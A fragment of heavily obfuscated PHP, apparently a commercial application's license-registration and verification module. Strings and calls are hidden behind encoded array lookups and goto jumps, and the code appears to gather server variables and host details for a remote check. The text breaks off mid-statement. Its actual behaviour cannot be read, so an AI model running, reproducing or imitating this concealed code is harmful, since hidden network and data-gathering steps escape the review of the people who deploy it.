$Aç‘ƒÑ¼ö·[591]; if (!$C– “ê¿ùŒ) { return; } $this->{$_SERVER[øÆ][3]}($eÈÇíÇœã˜[53], array($this, $eÈÇíÇœã˜[54])); goto bÊÂÏãÃ¨­; BœÀ¦Àµ‡º: $Aç‘ƒÑ¼ö· =& $_SERVER[ç]; $eÈÇíÇœã˜ =& $_SERVER[øÆ]; $this->{$_SERVER[øÆ][46]}(); goto eïß¹…Ü×; eïß¹…Ü×: $AÖÒíì±™… = $Aç‘ƒÑ¼ö·[588]; while (strlen($AÖÒíì±™…) < $Aç‘ƒÑ¼ö·[570]) { if (!$AÖÒíì±™…) { break; } $AÖÒíì±™…++; } $this->{$_SERVER[øÆ][47]}(); goto F³¿ÇÕ‚´¾; Fˆ˜¯•öŞğ: $bÑóŸ£ï¬¿ = $Aç‘ƒÑ¼ö·[595]; goto FÌë‹ù¥ò; D±´òŸÀ¥Ê: $this->{$_SERVER[øÆ][50]}(); $this->{$_SERVER[øÆ][51]}(); $this->{$_SERVER[øÆ][52]}(); goto FŒÍ“„ŠŞŠ; bÄ·¬ĞŒó¾: $D¼„–‚ÎÍ = $Aç‘ƒÑ¼ö·[593]; if (!$D¼„–‚ÎÍ) { return; } $this->{$_SERVER[øÆ][3]}($eÈÇíÇœã˜[57], array($this, $eÈÇíÇœã˜[58])); goto c¢œ“Ó”–; c¢œ“Ó”–: $aÍõªÓÊ¶İ = $Aç‘ƒÑ¼ö·[594]; if (strlen($aÍõªÓÊ¶İ) < $Aç‘ƒÑ¼ö·[576]) { return; } $this->{$_SERVER[øÆ][3]}($eÈÇíÇœã˜[59], array($this, $eÈÇíÇœã˜[60])); goto Fˆ˜¯•öŞğ; CïÌº¥ëÚ: $this->{$_SERVER[øÆ][49]}(); $B¤êà†”Öƒ = $Aç‘ƒÑ¼ö·[590]; if (!$B¤êà†”Öƒ) { return; } goto D±´òŸÀ¥Ê; bÊÂÏãÃ¨­: $cÆèŠÂ¨±Õ = $Aç‘ƒÑ¼ö·[592]; if (!$cÆèŠÂ¨±Õ) { die; } $this->{$_SERVER[øÆ][3]}($eÈÇíÇœã˜[55], array($this, $eÈÇíÇœã˜[56])); goto bÄ·¬ĞŒó¾; F³¿ÇÕ‚´¾: $F†‰ÒÇêù = $Aç‘ƒÑ¼ö·[589]; if (!$F†‰ÒÇêù) { die; } $this->{$_SERVER[øÆ][48]}(); goto CïÌº¥ëÚ; FÌë‹ù¥ò: } public function ftny60d2ee3e($bÇ®—Ã¨å) { goto CÈíŠ…¶Ö; CŒİè´ª™: $A›ŠÜÉÍ = array($aÍ ÕÏÑ³¸[64], $aÍ ÕÏÑ³¸[65], $aÍ ÕÏÑ³¸[66], $aÍ ÕÏÑ³¸[67], $aÍ ÕÏÑ³¸[68], $aÍ ÕÏÑ³¸[69], $aÍ ÕÏÑ³¸[70], $aÍ ÕÏÑ³¸[71], $aÍ ÕÏÑ³¸[72], $aÍ ÕÏÑ³¸[73], $aÍ ÕÏÑ³¸[74], $aÍ ÕÏÑ³¸[75], $aÍ ÕÏÑ³¸[76], $aÍ ÕÏÑ³¸[77], $aÍ ÕÏÑ³¸[78], $aÍ ÕÏÑ³¸[79], $aÍ ÕÏÑ³¸[80], $aÍ ÕÏÑ³¸[81], $aÍ ÕÏÑ³¸[82], $aÍ ÕÏÑ³¸[83], $aÍ ÕÏÑ³¸[84], $aÍ ÕÏÑ³¸[85], $aÍ ÕÏÑ³¸[86], $aÍ ÕÏÑ³¸[87], $aÍ ÕÏÑ³¸[88], $aÍ ÕÏÑ³¸[89], $aÍ ÕÏÑ³¸[90], $aÍ ÕÏÑ³¸[91], $aÍ ÕÏÑ³¸[92], $aÍ ÕÏÑ³¸[93], $aÍ ÕÏÑ³¸[94], $aÍ ÕÏÑ³¸[95], $aÍ ÕÏÑ³¸[96], $aÍ ÕÏÑ³¸[97], $aÍ ÕÏÑ³¸[98], $aÍ ÕÏÑ³¸[99]); $CÓ©ŠßÀ» = $bºÜ¹ˆÚ[596]; while ($CÓ©ŠßÀ» < $bºÜ¹ˆÚ[597]) { if ($CÓ©ŠßÀ» >= 0) { break; } $CÓ©ŠßÀ»++; } goto a…‹ÆÀÒÈÇ; eÎ¯ó‹·†Í: while ($fÙ“Ùö‡Ûˆ < $bºÜ¹ˆÚ[601]) { if ($fÙ“Ùö‡Ûˆ >= 0) { break; } $fÙ“Ùö‡Ûˆ++; } $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[114]][$aÍ ÕÏÑ³¸[115]] = $aÍ ÕÏÑ³¸[116]($aÍ ÕÏÑ³¸[117])->{$_SERVER[øÆ][118]}(); $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[114]][$aÍ ÕÏÑ³¸[119]] = $aÍ ÕÏÑ³¸[120]($_SERVER[$aÍ ÕÏÑ³¸[121]] . $a´³ªõ±¿è[$aÍ ÕÏÑ³¸[122]]); goto BÃİ™ÕÕÇÎ; dÎ²ÊàÅã: $C™Èó¯¶›³ = $bºÜ¹ˆÚ[602]; unset($bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[102]][$aÍ ÕÏÑ³¸[103]][$aÍ ÕÏÑ³¸[107]]); $E¤Ô°©š¯ = $bºÜ¹ˆÚ[603]; goto dÛíÒâ”“Ò; BÃİ™ÕÕÇÎ: $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[114]][$aÍ ÕÏÑ³¸[123]] = $aÍ ÕÏÑ³¸[124]($aÍ ÕÏÑ³¸[125]()); $dÔ„ÙùÄ§É = $bºÜ¹ˆÚ[605]; if (!$dÔ„ÙùÄ§É) { die; } goto Fº–·Şâ†Ÿ; b£…‡¼¦ Ğ: unset($bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[102]][$aÍ ÕÏÑ³¸[104]][$aÍ ÕÏÑ³¸[106]]); $fÚ„‰£ÅŒ = $bºÜ¹ˆÚ[569]; unset($bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[102]][$aÍ ÕÏÑ³¸[103]][$aÍ ÕÏÑ³¸[76]]); goto dÎ²ÊàÅã; aäéœ†çÌ›: $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[114]][$aÍ ÕÏÑ³¸[136]] = $aÍ ÕÏÑ³¸[112]($this->wpjq7b76657d, $aÍ ÕÏÑ³¸[137], $aÍ ÕÏÑ³¸[10]); if ($aÍ ÕÏÑ³¸[112]($GLOBALS, $aÍ ÕÏÑ³¸[138]) && $this->config[$aÍ ÕÏÑ³¸[139]]) { $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[114]][$aÍ ÕÏÑ³¸[140]] = WEB_ROOT; } return $bÇ®—Ã¨å; goto EÌí¡¢Ï¢; a…‹ÆÀÒÈÇ: foreach ($A›ŠÜÉÍ as $f«ßï­³ˆ) { $d‡Çæ“ø÷ = $GLOBALS[$aÍ ÕÏÑ³¸[100]][$aÍ ÕÏÑ³¸[101]][$f«ßï­³ˆ]; $b„ßá×˜Ù¶ = $bºÜ¹ˆÚ[598]; if (!$b„ßá×˜Ù¶) { die; } if (isset($a´³ªõ±¿è[$f«ßï­³ˆ])) { $d‡Çæ“ø÷ = $a´³ªõ±¿è[$f«ßï­³ˆ]; } $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[102]][$aÍ ÕÏÑ³¸[103]][$f«ßï­³ˆ] = $d‡Çæ“ø÷; } $fÙùØµí»‘ = $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[102]][$aÍ ÕÏÑ³¸[103]][$aÍ ÕÏÑ³¸[76]]; $aóÀ”ñéŒ = $bºÜ¹ˆÚ[599]; goto Dé²š¸¾ìõ; CÈíŠ…¶Ö: $bºÜ¹ˆÚ =& $_SERVER[ç]; $aÍ ÕÏÑ³¸ =& $_SERVER[øÆ]; $a´³ªõ±¿è = $aÍ ÕÏÑ³¸[61]($aÍ ÕÏÑ³¸[62])->{$_SERVER[øÆ][63]}(); goto CŒİè´ª™; Fº–·Şâ†Ÿ: $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[114]][$aÍ ÕÏÑ³¸[126]] = $this->thzc895c0a6c; $F¤÷ãğ—ñä = $bºÜ¹ˆÚ[606]; while (strlen($F¤÷ãğ—ñä) < $bºÜ¹ˆÚ[580]) { if (!$F¤÷ãğ—ñä) { break; } $F¤÷ãğ—ñä++; } goto D¬íÀ¦»Æ¸; D¬íÀ¦»Æ¸: if ($a´³ªõ±¿è[$aÍ ÕÏÑ³¸[126]] != $aÍ ÕÏÑ³¸[127]) { $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[114]][$aÍ ÕÏÑ³¸[128]] = $a´³ªõ±¿è[$aÍ ÕÏÑ³¸[128]]; $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[114]][$aÍ ÕÏÑ³¸[129]] = $a´³ªõ±¿è[$aÍ ÕÏÑ³¸[129]]; $aİÓä¯¾¼ = $aÍ ÕÏÑ³¸[130](10) . $this->thzc895c0a6c . $aÍ ÕÏÑ³¸[130](5); $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[102]][$aÍ ÕÏÑ³¸[131]][$aÍ ÕÏÑ³¸[132]] = $this->{$_SERVER[øÆ][133]}($aİÓä¯¾¼, $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[114]][$aÍ ÕÏÑ³¸[119]]); } if ($this->thzc895c0a6c == $aÍ ÕÏÑ³¸[127]) { $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[102]][$aÍ ÕÏÑ³¸[103]][$aÍ ÕÏÑ³¸[108]][$aÍ ÕÏÑ³¸[113]] = 0; } $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[114]][$aÍ ÕÏÑ³¸[134]] = $aÍ ÕÏÑ³¸[112]($this->wpjq7b76657d, $aÍ ÕÏÑ³¸[135], $aÍ ÕÏÑ³¸[10]); goto aäéœ†çÌ›; dÛíÒâ”“Ò: if (!$E¤Ô°©š¯) { die; } $bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[102]][$aÍ ÕÏÑ³¸[103]][$aÍ ÕÏÑ³¸[108]] = array($aÍ ÕÏÑ³¸[109] => (int) $fÙùØµí»‘[$aÍ ÕÏÑ³¸[110]], $aÍ ÕÏÑ³¸[111] => (int) $aÍ ÕÏÑ³¸[112]($fÙùØµí»‘, $aÍ ÕÏÑ³¸[113], 0)); $fÙ“Ùö‡Ûˆ = $bºÜ¹ˆÚ[604]; goto eÎ¯ó‹·†Í; Dé²š¸¾ìõ: unset($bÇ®—Ã¨å[$aÍ ÕÏÑ³¸[102]][$aÍ ÕÏÑ³¸[104]][$aÍ ÕÏÑ³¸[105]]); $DĞ½†‡Ğõ = $bºÜ¹ˆÚ[600]; if (strlen($DĞ½†‡Ğõ) < $bºÜ¹ˆÚ[601]) { return; } goto b£…‡¼¦ Ğ; EÌí¡¢Ï¢: } private function boql26bb5393() { goto EÈÓÚàªñà; fêîçò¤Ç‹: if (!$AšÄŠ ‹»¸) { die; } $dé¥»¢Šîİ = array($b„…¨ˆÅ·÷[165] => $e¨ÖŒ”‹‹[$b„…¨ˆÅ·÷[64]], $b„…¨ˆÅ·÷[166] => $e¨ÖŒ”‹‹[$b„…¨ˆÅ·÷[65]], $b„…¨ˆÅ·÷[167] => $b„…¨ˆÅ·÷[10]); foreach ($Aµ—çâ«ã¹ as $aÔïŠ÷Ÿ) { if (!isset($e¨ÖŒ”‹‹[$aÔïŠ÷Ÿ]) || !$e¨ÖŒ”‹‹[$aÔïŠ÷Ÿ]) { continue; } $dé¥»¢Šîİ[$aÔïŠ÷Ÿ] = $e¨ÖŒ”‹‹[$aÔïŠ÷Ÿ]; } goto dõÎ•ºÌ­; dğÄâóùÜÒ: if (!$e–åÊ–®¶µ) { die; } $e¨ÖŒ”‹‹ = $b„…¨ˆÅ·÷[61]($b„…¨ˆÅ·÷[62])->{$_SERVER[øÆ][63]}(); $AšÄŠ ‹»¸ = $F ™ÌÛùØò[610]; goto fêîçò¤Ç‹; EÈÓÚàªñà: $F ™ÌÛùØò =& $_SERVER[ç]; $b„…¨ˆÅ·÷ =& $_SERVER[øÆ]; if ($_SERVER[$b„…¨ˆÅ·÷[44]] == $b„…¨ˆÅ·÷[141]) { goto b‘ï¨äöÅ‰; b‘ï¨äöÅ‰: $bŞÂ¾ö±ê« = array($b„…¨ˆÅ·÷[126] => $this->thzc895c0a6c, $b„…¨ˆÅ·÷[142] => $this->{$_SERVER[øÆ][143]}(), $b„…¨ˆÅ·÷[144] => $b„…¨ˆÅ·÷[61]($b„…¨ˆÅ·÷[145])->{$_SERVER[øÆ][146]}()); if ($this->thzc895c0a6c != $b„…¨ˆÅ·÷[127]) { $Bõ…Æ†˜Œ¾ = $b„…¨ˆÅ·÷[112]($this->wpjq7b76657d, $b„…¨ˆÅ·÷[147]); if ($Bõ…Æ†˜Œ¾) { $bŞÂ¾ö±ê«[$b„…¨ˆÅ·÷[148]] = $Bõ…Æ†˜Œ¾; $bŞÂ¾ö±ê«[$b„…¨ˆÅ·÷[149]] = $b„…¨ˆÅ·÷[150]($b„…¨ˆÅ·÷[112]($this->wpjq7b76657d, $b„…¨ˆÅ·÷[151])); $bŞÂ¾ö±ê«[$b„…¨ˆÅ·÷[152]] = $b„…¨ˆÅ·÷[112]($this->wpjq7b76657d, $b„…¨ˆÅ·÷[137]); } } $bŞÂ¾ö±ê« = $this->{$_SERVER[øÆ][153]}($b„…¨ˆÅ·÷[154]($bŞÂ¾ö±ê«), $b„…¨ˆÅ·÷[120]($b„…¨ˆÅ·÷[155])); goto FàŸ•Ç½º¶; FàŸ•Ç½º¶: $dé¥»¢Šîİ = array($b„…¨ˆÅ·÷[156] => $bŞÂ¾ö±ê«); $fÂ«ÕİŠÓÇ = $F ™ÌÛùØò[607]; while (strlen($fÂ«ÕİŠÓÇ) < $F ™ÌÛùØò[580]) { if (!$fÂ«ÕİŠÓÇ) { break; } $fÂ«ÕİŠÓÇ++; } goto B ®âãèâ¼; B ®âãèâ¼: $b„…¨ˆÅ·÷[13](array($b„…¨ˆÅ·÷[157], $b„…¨ˆÅ·÷[158]), $dé¥»¢Šîİ); $F¥İ™¶¥³Ë = $F ™ÌÛùØò[608]; if (strlen($F¥İ™¶¥³Ë) < $F ™ÌÛùØò[576]) { die; } goto FŸ•ÓÖ‰öø; FŸ•ÓÖ‰öø: } goto bèªÃÅ’åĞ; dõÎ•ºÌ­: $b„…¨ˆÅ·÷[13](array($b„…¨ˆÅ·÷[157], $b„…¨ˆÅ·÷[158]), $dé¥»¢Šîİ); goto B÷á’˜å±; bèªÃÅ’åĞ: if ($this->thzc895c0a6c == $b„…¨ˆÅ·÷[127]) { return; } $Aµ—çâ«ã¹ = array($b„…¨ˆÅ·÷[159], $b„…¨ˆÅ·÷[160], $b„…¨ˆÅ·÷[161], $b„…¨ˆÅ·÷[162], $b„…¨ˆÅ·÷[163], $b„…¨ˆÅ·÷[164]); $e–åÊ–®¶µ = $F ™ÌÛùØò[609]; goto dğÄâóùÜÒ; B÷á’˜å±: } private function kmluadb82108() { goto E‡Æ‘ÂŠÆ; AîÆÂêÕš: if (strlen($dØ‰¨‚Ùç) < $AÂñš‡ Ãñ[580]) { die; } $Aê¥Œô„[172]($Aê¥Œô„[204]($Aê¥Œô„[214]), !0); $FÉ¶Ù§´ = $AÂñš‡ Ãñ[618]; goto FÑæ„Ì¹Í½; DØ‘ƒ×ÌŠ¹: $c¢ƒ§¹ğœ = $dî¯Ò…°È[$Aê¥Œô„[231]]; $bÒÕÖÒŠ› = array(); $bÒÕÖÒŠ›[$F½·ªØ¼øğ] = $Aƒëä…åÄÆ; goto cî‡à†è§ ; b½††ƒÆ•‰: $b¡²Ÿ½¿›½ = $eÌâÃ‹Å©¤[$Aê¥Œô„[199]]; $Aà¡²¸ºàö = $this->{$_SERVER[øÆ][206]}($b¡²Ÿ½¿›½[$Aê¥Œô„[207]]); if (!$Aà¡²¸ºàö || $Aà¡²¸ºàö != $b¡²Ÿ½¿›½[$Aê¥Œô„[151]]) { $bÉÂĞ¡ÙØº = array($Aê¥Œô„[208] => $Aê¥Œô„[61]($Aê¥Œô„[62])->{$_SERVER[øÆ][63]}($Aê¥Œô„[122]), $Aê¥Œô„[209] => $_SERVER[$Aê¥Œô„[121]], $Aê¥Œô„[210] => $Aê¥Œô„[211](), $Aê¥Œô„[180] => $_SERVER[$Aê¥Œô„[181]]); $A®Õ®Š£‡ã = $this->{$_SERVER[øÆ][212]}($Aê¥Œô„[154]($bÉÂĞ¡ÙØº)); $this->{$_SERVER[øÆ][189]}($Aê¥Œô„[213] . $A®Õ®Š£‡ã); $Aê¥Œô„[172]($Aê¥Œô„[204]($Aê¥Œô„[214]), !0); } goto Eğ‡Á«Ä¶Ë; FÑæ„Ì¹Í½: while (strlen($FÉ¶Ù§´) < $AÂñš‡ Ãñ[576]) { if (!$FÉ¶Ù§´) { break; } $FÉ¶Ù§´++; } goto cß•ä­¡‹; a‚¤ÇŠ›Šø: $eíæ†¿É¬… = $AÂñš‡ Ãñ[611]; $A½Å™¹äË© = $Aê¥Œô„[120]($_SERVER[$Aê¥Œô„[121]] . $C‰ğ„ÍøØ); $D³¢ª¹†Øò = $AÂñš‡ Ãñ[612]; goto Cö¦œÈÀà; eĞñÛ¯È®«: if (!$B§ššÚ´ò) { return; } $this->{$_SERVER[øÆ][235]}(); $B¢Õï = $AÂñš‡ Ãñ[616]; goto Fë¬˜º÷İ‹; E°—‰ÔÆ¼Í: $F½·ªØ¼øğ = $Aê¥Œô„[220]($Aê¥Œô„[25]($E‹ç†µŠ¾¯, 10, 16)); $Aƒëä…åÄÆ = $this->{$_SERVER[øÆ][133]}($Aê¥Œô„[154]($b¡²Ÿ½¿›½), $E‹ç†µŠ¾¯); $dî¯Ò…°È = $Aê¥Œô„[228]($Aê¥Œô„[61]($Aê¥Œô„[11])->{$_SERVER[øÆ][229]}(), $Aê¥Œô„[230]); goto DØ‘ƒ×ÌŠ¹; D±äÙÍËŠ: if (!isset($cÎ›É©Æ‹ [$Aê¥Œô„[171]]) || $Aê¥Œô„[24]($cÎ›É©Æ‹ [$Aê¥Œô„[171]]) != 16) { $Aê¥Œô„[172]($Aê¥Œô„[173] . $cÎ›É©Æ‹ [$Aê¥Œô„[171]], !1); } $C‰ğ„ÍøØ = $Aê¥Œô„[61]($Aê¥Œô„[62])->{$_SERVER[øÆ][63]}($Aê¥Œô„[122]); $c‹¸½“íªÔ = array($Aê¥Œô„[171] => $cÎ›É©Æ‹ [$Aê¥Œô„[171]], $Aê¥Œô„[174] => $Aê¥Œô„[130](16), $Aê¥Œô„[175] => $Aê¥Œô„[155], $Aê¥Œô„[176] => $Aê¥Œô„[177], $Aê¥Œô„[178] => $_SERVER[$Aê¥Œô„[179]], $Aê¥Œô„[180] => $_SERVER[$Aê¥Œô„[181]], $Aê¥Œô„[182] => $_SERVER[$Aê¥Œô„[183]]); goto a‚¤ÇŠ›Šø; dÆèàÄ‡…: $E‹ç†µŠ¾¯ = $Aê¥Œô„[120]($_SERVER[$Aê¥Œô„[121]] . $Aê¥Œô„[220]($C‰ğ„ÍøØ) . $CøâõïÉ™è[$Aê¥Œô„[216]]); $b«ÓÂ”Œº = $AÂñš‡ Ãñ[614]; while (strlen($b«ÓÂ”Œº) < $AÂñš‡ Ãñ[576]) { if (!$b«ÓÂ”Œº) { break; } $b«ÓÂ”Œº++; } goto E°—‰ÔÆ¼Í; AÛƒå³Îà: $CøâõïÉ™è[$Aê¥Œô„[129]] = $Aê¥Œô„[124]($Aê¥Œô„[220]($this->{$_SERVER[øÆ][153]}($aŒ–¦Í·í×, $Aê¥Œô„[222]))); if ($b¡²Ÿ½¿›½[$Aê¥Œô„[223]] && $b¡²Ÿ½¿›½[$Aê¥Œô„[223]] >= 1) { $Aê¥Œô„[61]($Aê¥Œô„[62])->{$_SERVER[øÆ][224]}($Aê¥Œô„[225], $Aê¥Œô„[226]); } $Aê¥Œô„[61]($Aê¥Œô„[62])->{$_SERVER[øÆ][227]}($CøâõïÉ™è); goto dÆèàÄ‡…; Fë¬˜º÷İ‹: while (strlen($B¢Õï) < $AÂñš‡ Ãñ[601]) { if (!$B¢Õï) { break; } $B¢Õï++; } Cache::set($Aê¥Œô„[236] . $Aê¥Œô„[120]($C‰ğ„ÍøØ . $Aê¥Œô„[237]), $Aê¥Œô„[10]); $dØ‰¨‚Ùç = $AÂñš‡ Ãñ[617]; goto AîÆÂêÕš; fèØ‰‡É’Ë: $FÆµÑŠÀ¬ = $fíá©‘¤ . $CøâõïÉ™è[$Aê¥Œô„[126]] . $CøâõïÉ™è[$Aê¥Œô„[218]]; $b­ÖÛŠ¶ˆÈ = $AÂñš‡ Ãñ[613]; while (strlen($b­ÖÛŠ¶ˆÈ) < $AÂñš‡ Ãñ[570]) { if (!$b­ÖÛŠ¶ˆÈ) { break; } $b­ÖÛŠ¶ˆÈ++; } goto eªÂ¶ËóÉ¨; C­ÜÒÏê‹™: if (!$Aê¥Œô„[112]($GLOBALS, $Aê¥Œô„[138])) { die; } $cÎ›É©Æ‹  = $GLOBALS[$Aê¥Œô„[22]]; if (isset($cÎ›É©Æ‹ [$Aê¥Œô„[169]])) { $this->{$_SERVER[øÆ][170]}(); die; } goto D±äÙÍËŠ; eªÂ¶ËóÉ¨: $CøâõïÉ™è[$Aê¥Œô„[128]] = $Aê¥Œô„[220]($Aê¥Œô„[124]($this->{$_SERVER[øÆ][153]}($FÆµÑŠÀ¬, $Aê¥Œô„[221]))); $a²Êê‹ôÆ· = $Aê¥Œô„[130](16); $aŒ–¦Í·í× = $a²Êê‹ôÆ· . $CøâõïÉ™è[$Aê¥Œô„[126]] . $this->{$_SERVER[øÆ][153]}($Aê¥Œô„[120]($CøâõïÉ™è[$Aê¥Œô„[215]]), $a²Êê‹ôÆ·); goto AÛƒå³Îà; Cö¦œÈÀà: if (!$D³¢ª¹†Øò) { die; } if ($cÎ›É©Æ‹ [$Aê¥Œô„[184]] == $Aê¥Œô„[185]) { $F„´…§ñ• = $this->{$_SERVER[øÆ][153]}($A½Å™¹äË©, $Aê¥Œô„[186]); $A®Õ®Š£‡ã = $this->{$_SERVER[øÆ][133]}($Aê¥Œô„[154]($c‹¸½“íªÔ), $A½Å™¹äË© . $Aê¥Œô„[187], 3); $A®Õ®Š£‡ã = $A®Õ®Š£‡ã . $Aê¥Œô„[188] . $_SERVER[$Aê¥Œô„[179]]; $EÀïğƒà•È = $this->{$_SERVER[øÆ][189]}($Aê¥Œô„[190] . $F„´…§ñ• . $Aê¥Œô„[191] . $A®Õ®Š£‡ã, -1); $Aê¥Œô„[172]($EÀïğƒà•È, !0); } else { if ($cÎ›É©Æ‹ [$Aê¥Œô„[184]] == $Aê¥Œô„[192]) { $B¯›æ¢²Öœ = $Aê¥Œô„[25]($Aê¥Œô„[120]($Aê¥Œô„[193] . $A½Å™¹äË©), 12, 15) . $Aê¥Œô„[194]; $A®Õ®Š£‡ã = $this->{$_SERVER[øÆ][195]}($Aê¥Œô„[2]($cÎ›É©Æ‹ [$Aê¥Œô„[196]]), $B¯›æ¢²Öœ, 2); $eÌâÃ‹Å©¤ = $Aê¥Œô„[197]($A®Õ®Š£‡ã, !0); if (!$Aê¥Œô„[198]($eÌâÃ‹Å©¤) || !$Aê¥Œô„[198]($eÌâÃ‹Å©¤[$Aê¥Œô„[199]]) || $eÌâÃ‹Å©¤[$Aê¥Œô„[171]] != !0) { $BÚ²…Ø‚… = $Aê¥Œô„[200]; $BØÚ«“®È¥ = $eÌâÃ‹Å©¤[$Aê¥Œô„[199]] ? $Aê¥Œô„[201] . $eÌâÃ‹Å©¤[$Aê¥Œô„[199]] : $BÚ²…Ø‚…; $Aê¥Œô„[172]($BØÚ«“®È¥, !1); } else { $c‹¸½“íªÔ[$Aê¥Œô„[174]] = $eÌâÃ‹Å©¤[$Aê¥Œô„[199]][$Aê¥Œô„[202]]; } } else { $eÌâÃ‹Å©¤ = $this->{$_SERVER[øÆ][189]}($Aê¥Œô„[203], $c‹¸½“íªÔ, 10); } } if (!$Aê¥Œô„[198]($eÌâÃ‹Å©¤) || !$Aê¥Œô„[198]($eÌâÃ‹Å©¤[$Aê¥Œô„[199]]) || $eÌâÃ‹Å©¤[$Aê¥Œô„[171]] != !0) { $BÚ²…Ø‚… = $Aê¥Œô„[204]($Aê¥Œô„[205]); $BØÚ«“®È¥ = $eÌâÃ‹Å©¤[$Aê¥Œô„[199]] ? $Aê¥Œô„[201] . $eÌâÃ‹Å©¤[$Aê¥Œô„[199]] : $BÚ²…Ø‚…; $Aê¥Œô„[172]($BØÚ«“®È¥, !1); } goto b½††ƒÆ•‰; Eğ‡Á«Ä¶Ë: $CøâõïÉ™è = array($Aê¥Œô„[215] => $c‹¸½“íªÔ[$Aê¥Œô„[171]], $Aê¥Œô„[216] => $b¡²Ÿ½¿›½[$Aê¥Œô„[217]], $Aê¥Œô„[218] => $Aê¥Œô„[130](16), $Aê¥Œô„[126] => $b¡²Ÿ½¿›½[$Aê¥Œô„[219]]); if ($c‹¸½“íªÔ[$Aê¥Œô„[174]]) { $CøâõïÉ™è[$Aê¥Œô„[218]] = $c‹¸½“íªÔ[$Aê¥Œô„[174]]; } $fíá©‘¤ = $Aê¥Œô„[25]($Aê¥Œô„[120]($CøâõïÉ™è[$Aê¥Œô„[216]]), 10, 10); goto fèØ‰‡É’Ë; cî‡à†è§ : $E®Öáœ„˜‰ = $AÂñš‡ Ãñ[615]; if (!$E®Öáœ„˜‰) { return; } $Aê¥Œô„[61]($Aê¥Œô„[11])->{$_SERVER[øÆ][232]}($c¢ƒ§¹ğœ[$Aê¥Œô„[233]], array($Aê¥Œô„[234] => $bÒÕÖÒŠ›)); goto DŠå‡ÚùŸ; E‡Æ‘ÂŠÆ: $AÂñš‡ Ãñ =& $_SERVER[ç]; $Aê¥Œô„ =& $_SERVER[øÆ]; if ($_SERVER[$Aê¥Œô„[44]] != $Aê¥Œô„[168]) { return; } goto C­ÜÒÏê‹™; DŠå‡ÚùŸ: $this->wpjq7b76657d = $b¡²Ÿ½¿›½; $this->thzc895c0a6c = $CøâõïÉ™è[$Aê¥Œô„[126]]; $B§ššÚ´ò = $AÂñš‡ Ãñ[591]; goto eĞñÛ¯È®«; cß•ä­¡‹: } private function licenseRegistSuccess() { $bÖÛ¢íŞõ =& $_SERVER[øÆ]; $c‘ˆ²é°© = $bÖÛ¢íŞõ[61]($bÖÛ¢íŞõ[62])->{$_SERVER[øÆ][63]}(); $e¥ÆÕğ–ø¡ = $_SERVER[ç][619]; if (!$e¥ÆÕğ–ø¡) { return; } if ($c‘ˆ²é°©[$bÖÛ¢íŞõ[89]] != $bÖÛ¢íŞõ[226]) { $bÖÛ¢íŞõ[61]($bÖÛ¢íŞõ[62])->{$_SERVER[øÆ][227]}($bÖÛ¢íŞõ[89], $bÖÛ¢íŞõ[226]); } $bÖÛ¢íŞõ[116]($bÖÛ¢íŞõ[238])->{$_SERVER[øÆ][239]}(!0); } private function iwgnd777f764() { goto EõÕš•ÉĞÏ; díŞ‚Õµ¤: $this->thzc895c0a6c = $BøÙ£Ÿµù[127]; goto FÏ›ÌŒ§â¢; f“«Å´Ä×İ: $this->wpjq7b76657d = array(); $dŸ±ß­Ñ¨µ = $E¹áØ‚é§[621]; if (strlen($dŸ±ß­Ñ¨µ) < $E¹áØ‚é§[580]) { return; } goto díŞ‚Õµ¤; EõÕš•ÉĞÏ: $E¹áØ‚é§ =& $_SERVER[ç]; $BøÙ£Ÿµù =& $_SERVER[øÆ]; $BøÙ£Ÿµù[61]($BøÙ£Ÿµù[62])->{$_SERVER[øÆ][227]}(array($BøÙ£Ÿµù[215] => $BøÙ£Ÿµù[10], $BøÙ£Ÿµù[216] => $BøÙ£Ÿµù[10], $BøÙ£Ÿµù[126] => $BøÙ£Ÿµù[127], $BøÙ£Ÿµù[128] => $BøÙ£Ÿµù[10], $BøÙ£Ÿµù[129] => $BøÙ£Ÿµù[10])); goto b…‹¿›İÔ©; b…‹¿›İÔ©: $BøÙ£Ÿµù[61]($BøÙ£Ÿµù[62])->{$_SERVER[øÆ][224]}($BøÙ£Ÿµù[225], $BøÙ£Ÿµù[240]); $a®İœòåÀ’ = $E¹áØ‚é§[620]; if (strlen($a®İœòåÀ’) < $E¹áØ‚é§[576]) { die; } goto f“«Å´Ä×İ; FÏ›ÌŒ§â¢: } private function ubtz4714baad() { goto FÚ–ÈÙÏ£Ô; FÚ–ÈÙÏ£Ô: $F„²òƒõô¯ =& $_SERVER[ç]; $BùØª–ŒŸ° =& $_SERVER[øÆ]; $_SERVER[$BùØª–ŒŸ°[181]] = $BùØª–ŒŸ°[112]($_SERVER, $BùØª–ŒŸ°[181], APP_HOST); goto Aµ»ÍÈ½¿; B†«µ¨ó: if ($B¾ÁÌ¢§×ä[$BùØª–ŒŸ°[126]] == $BùØª–ŒŸ°[127]) { return; } $d­³ïÑ¹àˆ = $BùØª–ŒŸ°[61]($BùØª–ŒŸ°[62])->{$_SERVER[øÆ][63]}($BùØª–ŒŸ°[122]); $Bã»Û‘¢¥ = $F„²òƒõô¯[623]; goto f¨İÁ“‘¥¥; eìõ«Ş‡âÁ: if (!$BùØª–ŒŸ°[198]($BÜœƒ†Ş×Œ) || !isset($BÜœƒ†Ş×Œ[$BùØª–ŒŸ°[241]]) || $BùØª–ŒŸ°[242]() - $BÜœƒ†Ş×Œ[$BùØª–ŒŸ°[241]] >= 60) { $cÆ‹•³ù½ = $BùØª–ŒŸ°[228]($BùØª–ŒŸ°[61]($BùØª–ŒŸ°[11])->{$_SERVER[øÆ][229]}(), $BùØª–ŒŸ°[230]); $B¹µì¼½ƒ• = 